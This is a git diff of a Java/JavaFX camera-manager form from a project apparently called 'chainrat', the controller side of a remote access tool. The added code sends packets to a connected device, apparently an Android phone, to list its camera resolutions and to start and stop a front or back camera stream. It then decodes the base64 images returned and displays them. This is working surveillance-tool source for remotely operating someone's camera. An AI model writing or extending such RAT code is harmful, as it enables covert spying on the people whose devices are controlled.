@@ -2,18 +2,26 @@ package com.nefi.chainrat.server.forms;
 
 import com.nefi.chainrat.server.Main;
 import com.nefi.chainrat.server.log.Log;
-import com.nefi.chainrat.server.network.ControlServer.ChainControlServer;
+import com.nefi.chainrat.server.network.ControlServer.CommandType;
 import com.nefi.chainrat.server.network.ControlServer.Connection;
 import com.nefi.chainrat.server.network.ControlServer.packets.CameraRequest;
 import com.nefi.chainrat.server.network.ControlServer.packets.CameraResponse;
+import com.nefi.chainrat.server.network.ControlServer.packets.Packet;
 import com.sun.glass.ui.Size;
 import javafx.application.Platform;
+import javafx.collections.FXCollections;
+import javafx.collections.ObservableList;
 import javafx.event.ActionEvent;
 import javafx.fxml.Initializable;
 import javafx.scene.control.*;
+import javafx.scene.image.Image;
 import javafx.scene.image.ImageView;
 
+import javax.imageio.ImageIO;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayInputStream;
 import java.net.URL;
+import java.util.Base64;
 import java.util.ResourceBundle;
 
 public class frmCameraManager implements Initializable {
@@ -30,9 +38,10 @@ public class frmCameraManager implements Initializable {
     private Log log;
     private Connection connection;
     private ToggleGroup toggleGroup = new ToggleGroup();
+    public static final ObservableList<String> clientEntries = FXCollections.observableArrayList();
 
-    private Size[] frontSizes;
-    private Size[] backSizes;
+    private Size[] frontSizes = new Size[]{};
+    private Size[] backSizes = new Size[]{};
 
     public frmCameraManager(Connection connection){
         this.connection = connection;
@@ -44,42 +53,94 @@ public class frmCameraManager implements Initializable {
         this.log = Main.getLog();
         this.rbFront.setToggleGroup(this.toggleGroup);
         this.rbBack.setToggleGroup(this.toggleGroup);
+        this.btnStartStream.setDisable(true);
         //Make request
-        CameraRequest cr = new CameraRequest(true, false, 640, 800);
-        String packet = Main.getGson().toJson(cr, CameraRequest.class);
-        ChainControlServer.writeStringToChannel(connection.channel, packet);
+        CameraRequest cr = new CameraRequest(true, false, 0, 0, false);
+        Packet packet = new Packet(CommandType.CAMERA_REQUEST, Main.serialize(cr, CameraRequest.class));
+
+        connection.channel.writeAndFlush(packet);
     }
 
-    public void onMessageRecieved(CameraResponse packet){
-        frontSizes = packet.dimensionsFront;
-        backSizes = packet.dimensionsBack;
+    public void onImageReceived(String base64image){
+        //Got image
+        //Client:
+        //byte[] pictureData
+        //String encoded = Base64.encodeToString(pictureData, Base64.DEFAULT);
+        //Packet out = new Packet(CommandType.IMAGE, encoded);
+        //Log.d(TAG, "GOT IMAGE");
+        byte[] pictureData = org.apache.commons.codec.binary.Base64.decodeBase64(base64image);
+        Image img = new Image(new ByteArrayInputStream(pictureData));
+        imageView.setImage(img);
+    }
 
-        Size[] sizes = rbFront.isSelected() ? frontSizes : backSizes;
+    public void onInfoReceived(CameraResponse packet){
+        //Convert to size
+        frontSizes = new Size[packet.frontWidth.length];
+        backSizes = new Size[packet.backWidth.length];
 
-        Platform.runLater(new Runnable() {
-            @Override
-            public void run() {
-                comboSize.getItems().clear();
-                for(Size size : sizes){
-                    comboSize.getItems().add(size.width + " x " + size.height);
-                }
-                comboSize.getSelectionModel().select(0);
-            }
-        });
+        for(int i = 0; i < packet.frontWidth.length; i++){
+            frontSizes[i] = new Size(packet.frontWidth[i], packet.frontHeight[i]);
+        }
+        for (int i = 0; i < packet.backWidth.length; i++){
+            backSizes[i] = new Size(packet.backWidth[i], packet.backHeight[i]);
+        }
+        updateSizes();
+        //Start Button is disabled by default enable it
+        btnStartStream.setDisable(false);
     }
 
     public void btnStartStream_Click(ActionEvent actionEvent) {
+        log.d(this, "Starting image stream...");
+        btnStartStream.setVisible(false);
+        btnStartStream.setDisable(true);
+        btnStopStream.setVisible(true);
+        btnStopStream.setDisable(false);
+
+        //Send start command
+        boolean useFront = rbFront.isSelected();
+        String[] dimensions = comboSize.getSelectionModel().getSelectedItem().toString().split("x");
+        int width = Integer.parseInt(dimensions[0]);
+        int height = Integer.parseInt(dimensions[1]);
+        CameraRequest cr = new CameraRequest(useFront, true, width, height, false);
+        Packet packet = new Packet(CommandType.CAMERA_REQUEST, Main.serialize(cr, CameraRequest.class));
+        connection.channel.writeAndFlush(packet);
     }
 
-
-
     public void btnStopStream_Click(ActionEvent actionEvent) {
+        log.d(this, "Stopping image stream...");
+        btnStopStream.setDisable(true);
+        btnStopStream.setVisible(false);
+        btnStartStream.setVisible(true);
+        btnStartStream.setDisable(false);
 
+        //send stop command
+        CameraRequest cr = new CameraRequest(true, true, 1, 1, true);
+        Packet packet = new Packet(CommandType.CAMERA_REQUEST, Main.serialize(cr, CameraRequest.class));
+        connection.channel.writeAndFlush(packet);
     }
 
     public void comboSize_changed(ActionEvent actionEvent) {
     }
 
     public void rbChanged(ActionEvent actionEvent) {
+        updateSizes();
+    }
+
+    public void updateSizes(){
+        final Size[] sizes = rbFront.isSelected() ? frontSizes : backSizes;
+        clientEntries.clear();
+        for(final Size size : sizes){
+            clientEntries.add(size.width + "x" + size.height);
+        }
+
+        Platform.runLater(new Runnable() {
+            @Override
+            public void run() {
+                comboSize.getSelectionModel().clearSelection();
+                comboSize.setValue(null);
+                comboSize.setItems(clientEntries);
+                comboSize.getSelectionModel().select(0);
+            }
+        });
     }
 }
